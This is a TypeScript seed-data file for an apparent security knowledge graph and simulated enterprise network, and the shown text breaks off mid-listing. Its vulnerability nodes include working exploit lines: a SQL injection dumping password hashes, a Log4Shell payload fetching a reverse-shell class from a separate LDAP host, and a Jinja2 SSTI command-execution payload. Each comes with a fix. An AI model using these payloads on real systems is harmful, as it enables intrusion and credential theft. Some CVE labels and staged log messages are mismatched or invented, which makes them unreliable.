export interface RawGraphNode {
  id: string;
  properties: {
    label: string;
    name?: string;
    description?: string;
    dataset?: string;
    status?: string;
    injected_by?: string;
    severity?: string;
    cvss?: number;
    cause?: string;
    reproduction?: string;
    installationProcedure?: string;
    symptoms?: string;
    troubleshootingProcess?: string;
    fixSolution?: string;
    verificationProcedure?: string;
    timestamp?: string;
    // Computer / System detailed properties
    hostname?: string;
    application?: string;
    technology?: string;
    cpu?: string;
    ram?: string;
    storage?: string;
    installedSoftware?: string;
    softwareVersions?: string;
    affectedComponent?: string;
    threat?: string;
    securityStatus?: string;
    vulnerabilityStatus?: string;
    associatedLogs?: string[];
    associatedBugs?: string[];
    purpose?: string;
    environment?: string;
    os?: string;
    version?: string;
    port?: number | string;
    ip?: string;
    service?: string;
    configFile?: string;
    configPath?: string;
    availableTools?: string;
    dependencies?: string;
    ai_generated_description?: boolean;
    ai_generated_at?: string;
    ai_model?: string;
    // Bug Code specific properties
    codeLanguage?: string;
    codeFileName?: string;
    buggyCode?: string;
    correctedCode?: string;
    errorMessage?: string;
    exploitScript?: string;
    rootCause?: string;
    fixExplanation?: string;
  };
}

export interface RawGraphEdge {
  from: string;
  to: string;
  label: string;
}

export interface RawGraphState {
  nodes: RawGraphNode[];
  edges: RawGraphEdge[];
  meta?: {
    engine?: string;
    isNeo4jAvailable?: boolean;
  };
}

export const DEFAULT_GRAPH_DATA: RawGraphState = {
  nodes: [
    // Threat Actors
    { id: 'APT29', properties: { label: 'ThreatActor', name: 'APT29 (Cozy Bear)', description: 'Russian state-sponsored advanced persistent threat actor targeting enterprise infrastructure.', dataset: 'MITRE ATT&CK' } },
    { id: 'FIN7', properties: { label: 'ThreatActor', name: 'FIN7 Syndicate', description: 'Financially motivated cybercrime group utilizing targeted application exploits.', dataset: 'MITRE ATT&CK' } },
    { id: 'Sandworm', properties: { label: 'ThreatActor', name: 'Sandworm Team', description: 'Destructive threat group known for zero-day exploitation against corporate networks.', dataset: 'MITRE ATT&CK' } },
    { id: 'Lazarus', properties: { label: 'ThreatActor', name: 'Lazarus Group', description: 'Advanced threat group conducting strategic corporate network reconnaissance.', dataset: 'MITRE ATT&CK' } },

    // Malware / Payload Entities
    { id: 'WellMess', properties: { label: 'Malware', name: 'WellMess RAT', description: 'Cross-platform modular RAT utilized by APT29 with encrypted C2 communication capabilities.', dataset: 'MITRE ATT&CK S0514' } },
    { id: 'Carbanak', properties: { label: 'Malware', name: 'Carbanak Backdoor', description: 'Targeted backdoor Trojan and remote administration tool used by FIN7 to execute automated commands.', dataset: 'MITRE ATT&CK S0030' } },

    // Attack Techniques
    { id: 'T1190', properties: { label: 'Technique', name: 'Exploit Public-Facing Application', description: 'Adversaries take advantage of weaknesses in Internet-facing computers and applications to cause unintended execution.', dataset: 'MITRE ATT&CK' } },
    { id: 'T1059', properties: { label: 'Technique', name: 'Command & Scripting Interpreter', description: 'Adversaries abuse command interpreters such as bash, python, or powershell to execute malicious commands.', dataset: 'MITRE ATT&CK' } },
    { id: 'T1078', properties: { label: 'Technique', name: 'Valid Accounts', description: 'Adversaries obtain and abuse credentials to access internal systems.', dataset: 'MITRE ATT&CK' } },

    // Active Vulnerability Vectors
    {
      id: 'CVE-2023-39417',
      properties: {
        label: 'Vulnerability',
        name: 'PostgreSQL SQL Injection & Dynamic Execution',
        description: 'Improper sanitization in customer search endpoint allowing dynamic SQL clause escaping, UNION dumping, and data exfiltration.',
        status: 'UNMITIGATED',
        injected_by: 'operator',
        severity: 'CRITICAL',
        cvss: 9.8,
        cause: 'Dynamic SQL query string concatenation without parameterized prepared statement placeholders ($1).',
        reproduction: `curl -X POST "http://192.168.10.107:5432/api/customer/query" -d "account=' OR '1'='1' UNION SELECT id, password_hash, 999999 FROM auth_vault--"`,
        installationProcedure: 'Transmit crafted SQL payload with escaped quote delimiters to trigger arbitrary PostgreSQL function execution.',
        symptoms: 'Database CPU spikes; unauthorized exfiltration of 14,200 customer records; syntax error traces in postgresql.log.',
        troubleshootingProcess: 'Inspect /var/log/postgresql/postgresql-16-main.log for "syntax error at or near OR" and audit dynamic query functions.',
        fixSolution: 'Convert dynamic query to parameterized prepared statements with typed argument placeholders ($1).',
        verificationProcedure: 'Execute SQL test probe "\' OR \'1\'=\'1\'--"; verify database handles input as literal text with zero data leakage.',
        timestamp: '2026-09-24T00:00:00.000Z',
        dataset: 'NVD CVE',
        codeLanguage: 'sql',
        codeFileName: 'customer_query_handler.sql',
        buggyCode: `-- Vulnerable Dynamic SQL Query (customer_query_handler.sql)
CREATE OR REPLACE FUNCTION search_customer(account_input TEXT) 
RETURNS TABLE(customer_id INT, full_name TEXT, balance NUMERIC) AS $$
BEGIN
    -- FLAW: Direct string interpolation of user input allows SQL injection
    RETURN QUERY EXECUTE 
        'SELECT id, name, account_balance FROM customer_accounts WHERE account_num = ''' || account_input || ''' AND active = TRUE';
END;
$$ LANGUAGE plpgsql;`,
        errorMessage: `PSQLException: ERROR: syntax error at or near "OR"
Position: 84
Payload injected: ' OR '1'='1' UNION SELECT id, password_hash, 999999 FROM auth_vault--
Extracted: 14,200 sensitive customer records dumped via SQL UNION injection.`,
        rootCause: 'Dynamic SQL string concatenation directly interpolated untrusted user input without parameterized placeholders ($1), enabling quotation mark escaping and arbitrary SQL execution with database superuser privileges.',
        correctedCode: `-- Hardened Parameterized Query (customer_query_handler.sql)
CREATE OR REPLACE FUNCTION search_customer(account_input TEXT) 
RETURNS TABLE(customer_id INT, full_name TEXT, balance NUMERIC) AS $$
BEGIN
    -- SAFE: Strictly parameterized prepared statement with typed placeholder ($1)
    RETURN QUERY EXECUTE 
        'SELECT id, name, account_balance FROM customer_accounts WHERE account_num = $1 AND active = TRUE'
        USING account_input;
END;
$$ LANGUAGE plpgsql;`,
        fixExplanation: 'Replaced insecure string concatenation with parameterized query EXECUTE ... USING $1, guaranteeing all user input is evaluated strictly as literal values.',
        exploitScript: `curl -s -X POST "http://192.168.10.107:5432/api/customer/search" \\
  -H "Content-Type: application/json" \\
  -d '{"account_id": "ACC-99\\' OR \\'1\\'=\\'1\\' UNION SELECT id, password_hash, 0 FROM admin_credentials--"}'`
      }
    },

    {
      id: 'CVE-2021-44228',
      properties: {
        label: 'Vulnerability',
        name: 'Log4Shell / Spring Boot JNDI RCE',
        description: 'Remote Code Execution in Spring Boot Employee Management application due to unvetted Log4j2 JNDI LDAP lookup parser.',
        status: 'UNMITIGATED',
        injected_by: 'operator',
        severity: 'CRITICAL',
        cvss: 10.0,
        cause: 'Unrestricted JNDI message lookup evaluation allowing remote Java bytecode loading and execution over LDAP.',
        reproduction: `curl -H 'User-Agent: \${jndi:ldap://192.168.10.200:1389/ExploitPayload}' http://192.168.10.114:8080/api/v1/employees/search?id=EMP-01`,
        installationProcedure: 'Send crafted HTTP request with \${jndi:ldap://...} expression to employee search endpoint triggering Log4j evaluation.',
        symptoms: 'Outbound LDAP connection initiated to remote address; reverse shell spawned in Java JVM context; rogue thread execution.',
        troubleshootingProcess: 'Grep /var/log/employeemgmt/app.log for "\${jndi:"; inspect JVM socket connections on non-standard ports.',
        fixSolution: 'Configure -Dlog4j2.formatMsgNoLookups=true and upgrade Spring Boot log4j-core library to version >= 2.17.1.',
        verificationProcedure: 'Inject benign probe \${jndi:ldap://127.0.0.1/test}; verify application records literal text with zero outbound lookups.',
        timestamp: '2026-09-24T00:00:00.000Z',
        dataset: 'NVD CVE',
        codeLanguage: 'java',
        codeFileName: 'EmployeeSearchController.java',
        buggyCode: `// Vulnerable Spring Boot Controller (EmployeeSearchController.java)
@RestController
@RequestMapping("/api/v1/employees")
public class EmployeeSearchController {
    private static final Logger logger = LogManager.getLogger(EmployeeSearchController.class);

    @GetMapping("/search")
    public ResponseEntity<Employee> searchEmployee(@RequestParam("id") String employeeId) {
        // FLAW: Unsanitized user string logged directly with JNDI lookup enabled
        logger.info("Audit search request for employee ID: " + employeeId);
        return ResponseEntity.ok(employeeService.findById(employeeId));
    }
}`,
        errorMessage: `2026-09-24 14:22:01.304 WARN [http-nio-8080-exec-3] org.apache.logging.log4j.core.net.JndiManager:
Attempting lookup: ldap://192.168.10.200:1389/ExploitPayload
java.lang.ClassCastException: Rogue remote payload class loaded from LDAP directory
Outbound socket connected to remote attacker daemon. Reverse shell spawned on port 4444.`,
        rootCause: 'Apache Log4j2 message parser automatically resolves nested lookup expressions like \${jndi:ldap://...}. When untrusted employee search parameters are logged, the Java runtime connects to remote rogue LDAP servers and deserializes arbitrary Java bytecode.',
        correctedCode: `// Hardened Spring Boot Controller (EmployeeSearchController.java)
@RestController
@RequestMapping("/api/v1/employees")
public class EmployeeSearchController {
    private static final Logger logger = LogManager.getLogger(EmployeeSearchController.class);

    @GetMapping("/search")
    public ResponseEntity<Employee> searchEmployee(
        @RequestParam("id") @Pattern(regexp = "^EMP-[0-9]{5}$") String employeeId
    ) {
        // SAFE: Strict regex validation and parameterized logging with lookup disabled
        logger.info("Audit search request for employee ID: {}", employeeId);
        return ResponseEntity.ok(employeeService.findById(employeeId));
    }
}
// Application properties hardened:
// log4j2.formatMsgNoLookups=true
// Upgraded log4j-core to 2.17.1+ / Spring Boot 3.2.0`,
        fixExplanation: 'Enforced log4j2.formatMsgNoLookups=true, upgraded log4j-core dependency, and added strict regex validation for input parameters.',
        exploitScript: `curl -s -X GET "http://192.168.10.114:8080/api/v1/employees/search?id=%24%7Bjndi%3Aldap%3A%2F%2F192.168.10.200%3A1389%2FExploit%7D" \\
  -H "User-Agent: \${jndi:ldap://192.168.10.200:1389/ReverseShell}"`
      }
    },

    {
      id: 'CVE-2023-30861',
      properties: {
        label: 'Vulnerability',
        name: 'Flask Jinja2 Server-Side Template Injection (SSTI)',
        description: 'Server-Side Template Injection in Flask Internal Analytics API allowing arbitrary remote command execution via unescaped metric parameter.',
        status: 'UNMITIGATED',
        injected_by: 'operator',
        severity: 'HIGH',
        cvss: 9.8,
        cause: 'Direct string formatting into render_template_string instead of passing variables via Jinja2 render context dictionary.',
        reproduction: `curl "http://192.168.10.121:5000/api/analytics/report?metric={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"`,
        installationProcedure: 'Transmit HTTP GET request with Jinja2 template interpolation syntax to trigger Python bytecode evaluation in Flask.',
        symptoms: 'Arbitrary shell command output returned in analytics HTML; file read access to /etc/passwd; unauthorized API privilege elevation.',
        troubleshootingProcess: 'Inspect Flask gunicorn error logs for Jinja2 template compile errors; verify input sanitization on metric query parameter.',
        fixSolution: 'Use render_template with isolated context dictionary passing and enforce whitelist validation on allowed metrics.',
        verificationProcedure: 'Send SSTI probe "{{ 7 * 7 }}"; verify application renders literal string "{{ 7 * 7 }}" without evaluating arithmetic expression.',
        timestamp: '2026-09-24T00:00:00.000Z',
        dataset: 'NVD CVE',
        codeLanguage: 'python',
        codeFileName: 'analytics_report_generator.py',
        buggyCode: `# Vulnerable Flask Analytics Endpoint (analytics_report_generator.py)
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/api/analytics/report')
def generate_report():
    user_metric = request.args.get('metric', 'DailyTraffic')
    # FLAW: User input formatted directly into template string instead of context dict
    template = f"""
    <div class="report">
        <h2>Analytics Report</h2>
        <p>Metric evaluated: {user_metric}</p>
    </div>
    """
    return render_template_string(template)`,
        errorMessage: `jinja2.exceptions.TemplateRuntimeError: Remote code execution triggered
Payload evaluated: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
Output captured: uid=1001(flask_app) gid=1001(analytics) groups=1001(analytics)
Privilege escalation: /etc/shadow access attempt detected on API-COMP-21.`,
        rootCause: 'Flask\'s render_template_string function processes Jinja2 syntax within the template itself. Passing unvalidated user input via f-string string interpolation causes the template engine to compile user-supplied double-curly braces {{ ... }} into Python bytecode instructions.',
        correctedCode: `# Hardened Flask Analytics Endpoint (analytics_report_generator.py)
from flask import Flask, request, render_template
import re

app = Flask(__name__)

ALLOWED_METRICS = {"DailyTraffic", "RevenueGrowth", "ChurnRate", "ServerLoad"}

@app.route('/api/analytics/report')
def generate_report():
    raw_metric = request.args.get('metric', 'DailyTraffic')
    # SAFE: Whitelist validation and isolated context dictionary passing
    metric = raw_metric if raw_metric in ALLOWED_METRICS else "DailyTraffic"
    return render_template('report.html', metric=metric)`,
        fixExplanation: 'Migrated from render_template_string to static render_template with auto-escaping enabled and strict whitelist validation against allowed metric names.',
        exploitScript: `curl -s "http://192.168.10.121:5000/api/analytics/report?metric=%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27whoami%27).read()%7D%7D"`
      }
    },

    // Mitigations
    { id: 'Mitigation-SQL-07', properties: { label: 'Mitigation', name: 'Parameterized Prepared Statements', description: 'Strict SQL parameter binding and database query validation for PostgreSQL.', status: 'APPROVED' } },
    { id: 'Mitigation-Java-14', properties: { label: 'Mitigation', name: 'JNDI NoLookups & Spring Patch', description: 'Log4j2 formatMsgNoLookups=true enforcement and upgraded Spring Boot dependencies.', status: 'APPROVED' } },
    { id: 'Mitigation-Python-21', properties: { label: 'Mitigation', name: 'Context Whitelisting & Jinja2 Autoescape', description: 'Strict metric input whitelisting and template sandbox isolation for Flask.', status: 'APPROVED' } },

    // THE 25 COMPUTERS (Computer 01 to Computer 25)
    {
      id: 'Computer 01',
      properties: {
        label: 'Software',
        name: 'Computer 01',
        hostname: 'WEB-COMP-01',
        application: 'E-Commerce Web Application',
        technology: 'Nginx / Node.js',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 (Kernel 6.8)',
        cpu: '4 vCPU AMD EPYC 7763',
        ram: '16 GB DDR5',
        storage: '250 GB NVMe SSD',
        installedSoftware: 'Nginx 1.25.4, Node.js v20.12.0, Express.js, PM2',
        softwareVersions: 'Nginx 1.25.4, Node.js 20.12.0',
        purpose: 'Customer-facing web storefront and product catalog checkout',
        port: 443,
        ip: '192.168.10.101',
        service: 'nginx-ecommerce.service',
        configFile: 'ecommerce.conf',
        configPath: '/etc/nginx/sites-available/ecommerce.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - No active vulnerability detected',
        vulnerabilityStatus: 'NONE',
        environment: 'Production Cloud DMZ',
        availableTools: 'certbot, systemctl, htop, curl',
        dependencies: 'openssl 3.2, glibc 2.39, libpcre2'
      }
    },
    {
      id: 'Computer 02',
      properties: {
        label: 'Software',
        name: 'Computer 02',
        hostname: 'PAY-COMP-02',
        application: 'Payment Processing Service',
        technology: 'Go / Microservice',
        os: 'Alpine Linux 3.19 (Hardened)',
        version: 'Alpine Linux 3.19',
        cpu: '4 vCPU Intel Xeon Platinum',
        ram: '8 GB ECC DDR5',
        storage: '120 GB Encrypted NVMe',
        installedSoftware: 'Go Runtime 1.22.1, Vault Agent 1.15.5, Envoy Proxy',
        softwareVersions: 'Go 1.22.1, Vault 1.15.5',
        purpose: 'PCI-DSS compliant payment processing and vault tokenization',
        port: 8443,
        ip: '192.168.10.102',
        service: 'payment-engine.service',
        configFile: 'paygate.yaml',
        configPath: '/etc/payment/paygate.yaml',
        status: 'HEALTHY',
        securityStatus: 'SECURE - PCI Vault Encrypted',
        vulnerabilityStatus: 'NONE',
        environment: 'PCI-DSS Isolated Network Zone',
        availableTools: 'vault-cli, openssl, tcpdump',
        dependencies: 'musl libc, libsodium 1.0.19'
      }
    },
    {
      id: 'Computer 03',
      properties: {
        label: 'Software',
        name: 'Computer 03',
        hostname: 'AUTH-COMP-03',
        application: 'Authentication & Identity Service',
        technology: 'Keycloak / OAuth2',
        os: 'Rocky Linux 9.3',
        version: 'Rocky Linux 9.3 (Blue Onyx)',
        cpu: '4 vCPU AMD EPYC',
        ram: '16 GB DDR4',
        storage: '200 GB SSD',
        installedSoftware: 'Keycloak 24.0.1, OpenJDK 21, OpenSSL 3.0',
        softwareVersions: 'Keycloak 24.0.1, Java 21.0.2',
        purpose: 'Single Sign-On (SSO), JWT issuance, and MFA policy gateway',
        port: 8080,
        ip: '192.168.10.103',
        service: 'keycloak.service',
        configFile: 'keycloak.conf',
        configPath: '/opt/keycloak/conf/keycloak.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Zero active findings',
        vulnerabilityStatus: 'NONE',
        environment: 'Enterprise Identity Subnet',
        availableTools: 'kcadm.sh, keytool, journalctl',
        dependencies: 'glibc 2.34, libcrypto 3.0'
      }
    },
    {
      id: 'Computer 04',
      properties: {
        label: 'Software',
        name: 'Computer 04',
        hostname: 'INGR-COMP-04',
        application: 'Public Ingress Gateway',
        technology: 'Envoy / Traefik Proxy',
        os: 'Debian GNU/Linux 12',
        version: 'Debian 12 (bookworm)',
        cpu: '8 vCPU AMD EPYC 7763',
        ram: '16 GB DDR5',
        storage: '100 GB NVMe',
        installedSoftware: 'Envoy Proxy 1.29.1, Coraza WAF, iptables',
        softwareVersions: 'Envoy 1.29.1',
        purpose: 'L7 edge load balancing, rate limiting, and TLS termination',
        port: 80,
        ip: '192.168.10.104',
        service: 'envoy-ingress.service',
        configFile: 'envoy.yaml',
        configPath: '/etc/envoy/envoy.yaml',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Edge WAF Active',
        vulnerabilityStatus: 'NONE',
        environment: 'Edge DMZ Perimeter',
        availableTools: 'envoy-ctl, nftables, htop',
        dependencies: 'openssl 3.0.11, glibc 2.36'
      }
    },
    {
      id: 'Computer 05',
      properties: {
        label: 'Software',
        name: 'Computer 05',
        hostname: 'INV-COMP-05',
        application: 'Inventory Management System',
        technology: 'Python / FastAPI',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 LTS',
        cpu: '4 vCPU AMD Ryzen',
        ram: '8 GB DDR4',
        storage: '250 GB SSD',
        installedSoftware: 'Python 3.12.2, Uvicorn, FastAPI 0.110.0, SQLAlchemy',
        softwareVersions: 'Python 3.12.2, FastAPI 0.110.0',
        purpose: 'Real-time warehouse stock tracking and supplier API sync',
        port: 8000,
        ip: '192.168.10.105',
        service: 'inventory-api.service',
        configFile: 'inventory.ini',
        configPath: '/srv/inventory/config.ini',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Corporate Supply Chain Zone',
        availableTools: 'pytest, pip, gunicorn',
        dependencies: 'pydantic 2.6, httpx 0.27'
      }
    },
    {
      id: 'Computer 06',
      properties: {
        label: 'Software',
        name: 'Computer 06',
        hostname: 'ORDER-COMP-06',
        application: 'Order Processing Pipeline',
        technology: 'Apache Kafka / Java',
        os: 'Rocky Linux 9.3',
        version: 'Rocky Linux 9.3',
        cpu: '8 vCPU AMD EPYC',
        ram: '32 GB ECC DDR4',
        storage: '1 TB SAS SSD',
        installedSoftware: 'Apache Kafka 3.7.0, OpenJDK 17, KRaft',
        softwareVersions: 'Kafka 3.7.0, Java 17.0.10',
        purpose: 'High-throughput asynchronous order ingestion and event bus',
        port: 9092,
        ip: '192.168.10.106',
        service: 'kafka-broker.service',
        configFile: 'server.properties',
        configPath: '/opt/kafka/config/kraft/server.properties',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Event Pipeline Tier',
        availableTools: 'kafka-topics.sh, kafka-console-consumer.sh',
        dependencies: 'glibc 2.34, zstd 1.5.5'
      }
    },
    {
      id: 'Computer 07',
      properties: {
        label: 'Software',
        name: 'Computer 07',
        hostname: 'DB-COMP-07',
        application: 'Customer Database',
        technology: 'PostgreSQL / SQL',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 LTS (Kernel 6.8)',
        cpu: '8 vCPU AMD EPYC 7763',
        ram: '32 GB DDR5 ECC',
        storage: '500 GB NVMe PCIe 4.0',
        installedSoftware: 'PostgreSQL 16.2, psql 16.2, pg_stat_statements, PostGIS 3.4',
        softwareVersions: 'PostgreSQL 16.2, Libpq 16.2',
        purpose: 'Stores relational customer accounts, orders, and balances',
        port: 5432,
        ip: '192.168.10.107',
        service: 'postgresql@16-main.service',
        configFile: 'postgresql.conf',
        configPath: '/etc/postgresql/16/main/postgresql.conf',
        status: 'COMPROMISED',
        threat: 'Database Vulnerability (SQL Injection)',
        affectedComponent: 'PostgreSQL Database Engine (customer_query_handler.sql)',
        securityStatus: 'COMPROMISED - Active SQL Injection Exploitation',
        vulnerabilityStatus: 'CVE-2023-39417',
        environment: 'Core Data Tier Subnet',
        availableTools: 'psql, pg_dump, vacuumdb, pg_top',
        dependencies: 'libpq5 16.2, libssl3, glibc 2.39',
        associatedLogs: [
          'WARN [postgres] PSQLException: syntax error at or near "OR"',
          'ALERT [audit] 14,200 records exfiltrated via SQL UNION query',
          'NOTICE [monitor] Database session 192.168.10.107:5432 flagged suspicious'
        ],
        associatedBugs: ['CVE-2023-39417']
      }
    },
    {
      id: 'Computer 08',
      properties: {
        label: 'Software',
        name: 'Computer 08',
        hostname: 'CACHE-COMP-08',
        application: 'Session Cache System',
        technology: 'Redis / In-Memory',
        os: 'Debian GNU/Linux 12',
        version: 'Debian 12',
        cpu: '4 vCPU Intel Xeon',
        ram: '16 GB DDR4',
        storage: '80 GB SSD',
        installedSoftware: 'Redis Server 7.2.4, jemalloc 5.3',
        softwareVersions: 'Redis 7.2.4',
        purpose: 'Low-latency user session tokens and caching layer',
        port: 6379,
        ip: '192.168.10.108',
        service: 'redis-server.service',
        configFile: 'redis.conf',
        configPath: '/etc/redis/redis.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Application Caching Tier',
        availableTools: 'redis-cli, redis-benchmark',
        dependencies: 'jemalloc 5.3, glibc 2.36'
      }
    },
    {
      id: 'Computer 09',
      properties: {
        label: 'Software',
        name: 'Computer 09',
        hostname: 'BUILD-COMP-09',
        application: 'DevOps CI/CD Build System',
        technology: 'GitLab Runner / Docker',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 LTS',
        cpu: '8 vCPU AMD Ryzen',
        ram: '32 GB DDR4',
        storage: '500 GB NVMe',
        installedSoftware: 'GitLab Runner 16.9.0, Docker Engine 25.0.3, Git 2.43',
        softwareVersions: 'Docker 25.0.3, Runner 16.9.0',
        purpose: 'Automated test runner, container build system, and deployment agent',
        port: 8081,
        ip: '192.168.10.109',
        service: 'gitlab-runner.service',
        configFile: 'config.toml',
        configPath: '/etc/gitlab-runner/config.toml',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'DevOps & Tooling Tier',
        availableTools: 'docker, gitlab-runner, git, buildx',
        dependencies: 'containerd 1.7.13, runc 1.1.12'
      }
    },
    {
      id: 'Computer 10',
      properties: {
        label: 'Software',
        name: 'Computer 10',
        hostname: 'K8S-COMP-10',
        application: 'Kubernetes Management Node',
        technology: 'Kubernetes / containerd',
        os: 'Fedora CoreOS 39',
        version: 'CoreOS 39 (Kernel 6.7)',
        cpu: '8 vCPU AMD EPYC',
        ram: '32 GB ECC DDR5',
        storage: '250 GB NVMe',
        installedSoftware: 'Kubernetes v1.29.2, containerd 1.7.12, Cilium CNI',
        softwareVersions: 'Kubernetes v1.29.2',
        purpose: 'Container orchestration control plane and pod scheduling',
        port: 6443,
        ip: '192.168.10.110',
        service: 'kubelet.service',
        configFile: 'kube-apiserver.yaml',
        configPath: '/etc/kubernetes/manifests/kube-apiserver.yaml',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Cloud Infrastructure VPC',
        availableTools: 'kubectl, crictl, etcdctl',
        dependencies: 'runc 1.1.11, etcd 3.5.12'
      }
    },
    {
      id: 'Computer 11',
      properties: {
        label: 'Software',
        name: 'Computer 11',
        hostname: 'LOG-COMP-11',
        application: 'Central Logging & Telemetry',
        technology: 'Elasticsearch / Fluentd',
        os: 'Debian GNU/Linux 12',
        version: 'Debian 12',
        cpu: '8 vCPU Intel Xeon',
        ram: '32 GB DDR4',
        storage: '1.5 TB NVMe',
        installedSoftware: 'Elasticsearch 8.12.2, Fluentd v1.16, OpenJDK 21',
        softwareVersions: 'Elasticsearch 8.12.2',
        purpose: 'Aggregates syslog, application traces, and access audit logs',
        port: 9200,
        ip: '192.168.10.111',
        service: 'elasticsearch.service',
        configFile: 'elasticsearch.yml',
        configPath: '/etc/elasticsearch/elasticsearch.yml',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Observability Management Tier',
        availableTools: 'curl, fluentd, elasticsearch-sql-cli',
        dependencies: 'Java 21, glibc 2.36'
      }
    },
    {
      id: 'Computer 12',
      properties: {
        label: 'Software',
        name: 'Computer 12',
        hostname: 'SIEM-COMP-12',
        application: 'Security Monitoring SIEM',
        technology: 'Wazuh / Suricata IDS',
        os: 'Rocky Linux 9.3',
        version: 'Rocky Linux 9.3',
        cpu: '8 vCPU AMD EPYC',
        ram: '32 GB DDR4',
        storage: '1 TB SSD',
        installedSoftware: 'Wazuh Manager 4.7.2, Suricata 7.0.3, ClamAV',
        softwareVersions: 'Wazuh 4.7.2, Suricata 7.0.3',
        purpose: 'Intrusion detection, rootkit scanning, and SOC compliance alerts',
        port: 1514,
        ip: '192.168.10.112',
        service: 'wazuh-manager.service',
        configFile: 'ossec.conf',
        configPath: '/var/ossec/etc/ossec.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'SecOps Restricted Tier',
        availableTools: 'wazuh-control, suricatasc, tcpdump',
        dependencies: 'libpcap, pcre2, openssl 3.0'
      }
    },
    {
      id: 'Computer 13',
      properties: {
        label: 'Software',
        name: 'Computer 13',
        hostname: 'MAIL-COMP-13',
        application: 'Corporate Email Transport',
        technology: 'Postfix / Dovecot',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 LTS',
        cpu: '4 vCPU Intel Xeon',
        ram: '16 GB DDR4',
        storage: '500 GB SAS',
        installedSoftware: 'Postfix 3.8.5, Dovecot 2.3.21, OpenDKIM, SpamAssassin',
        softwareVersions: 'Postfix 3.8.5, Dovecot 2.3.21',
        purpose: 'Corporate SMTP transport, IMAP mailbox sync, and DKIM signing',
        port: 25,
        ip: '192.168.10.113',
        service: 'postfix.service',
        configFile: 'main.cf',
        configPath: '/etc/postfix/main.cf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Enterprise Communications Tier',
        availableTools: 'postqueue, mailq, doveadm',
        dependencies: 'libsasl2, libssl3, glibc 2.39'
      }
    },
    {
      id: 'Computer 14',
      properties: {
        label: 'Software',
        name: 'Computer 14',
        hostname: 'EMP-COMP-14',
        application: 'Employee Management Application',
        technology: 'Java / Spring Boot',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 LTS (Kernel 6.8)',
        cpu: '6 vCPU Intel Xeon Platinum',
        ram: '16 GB DDR5',
        storage: '250 GB NVMe SSD',
        installedSoftware: 'OpenJDK 17.0.10, Spring Boot 2.7.0, Log4j2 2.14.1, Maven 3.9',
        softwareVersions: 'Java 17.0.10, Spring Boot 2.7.0, Log4j2 2.14.1',
        purpose: 'Internal employee profiles, staff directories, and access management',
        port: 8080,
        ip: '192.168.10.114',
        service: 'employee-management.service',
        configFile: 'application.properties',
        configPath: '/opt/employeemgmt/config/application.properties',
        status: 'COMPROMISED',
        threat: 'Application Vulnerability (Java Deserialization & RCE)',
        affectedComponent: 'Spring Boot Framework (EmployeeSearchController.java)',
        securityStatus: 'COMPROMISED - Active Log4Shell RCE Vector',
        vulnerabilityStatus: 'CVE-2021-44228',
        environment: 'Internal Corporate Services',
        availableTools: 'jstack, jmap, jcmd, visualvm',
        dependencies: 'spring-boot-starter-web 2.7.0, log4j-core 2.14.1',
        associatedLogs: [
          'WARN [log4j2] JNDI lookup triggered: ldap://192.168.10.200:1389/Exploit',
          'ALERT [jvm] Unauthorized thread spawned reverse shell on port 4444',
          'CRITICAL [monitor] Java process compromised on EMP-COMP-14'
        ],
        associatedBugs: ['CVE-2021-44228']
      }
    },
    {
      id: 'Computer 15',
      properties: {
        label: 'Software',
        name: 'Computer 15',
        hostname: 'HR-COMP-15',
        application: 'HR Records Portal',
        technology: 'PHP / Laravel',
        os: 'Debian GNU/Linux 12',
        version: 'Debian 12',
        cpu: '4 vCPU AMD Ryzen',
        ram: '8 GB DDR4',
        storage: '200 GB SSD',
        installedSoftware: 'PHP 8.3.3, Nginx 1.24, Composer 2.7, Laravel 10.45',
        softwareVersions: 'PHP 8.3.3, Laravel 10.45',
        purpose: 'Employee onboarding, benefits administration, and payroll records',
        port: 443,
        ip: '192.168.10.115',
        service: 'php8.3-fpm.service',
        configFile: 'hrportal.conf',
        configPath: '/etc/nginx/sites-available/hrportal.conf',
        status: 'HEALTHY',
        securityStatus: 'SECURE - Operational',
        vulnerabilityStatus: 'NONE',
        environment: 'Internal Operations Subnet',
        availableTools: 'php, artisan, composer',
        dependencies: 'php-fpm, php-mbstring, php-xml'
      }
    },
    {
      id: 'Computer 16',
      properties: {
        label: 'Software',
        name: 'Computer 16',
        hostname: 'STORE-COMP-16',
        application: 'File Management Storage',
        technology: 'Nextcloud / MinIO S3',
        os: 'Ubuntu 24.04 LTS',
        version: 'Ubuntu 24.04 LTS',
        cpu: '4 vCPU Intel Core',
        ram: '16 GB DDR4',
        storage: '2 TB ZFS Pool',
        installedSoftware: 'Nextcloud 28.0.3, MinIO RELEASE.2024-03-03, Apache 2.4',
        softwareVersions: 'Nextcloud 28.0.3, MinIO 2024.03',
        purpose: 'Enterprise file sharing, encrypted object storage, and docs backup',
        port: 9000,
        ip: '192.168.10.116',
        service: 'minio-s3.service',
        configFile: 'minio.env',
        configPath: '/etc/default/minio',
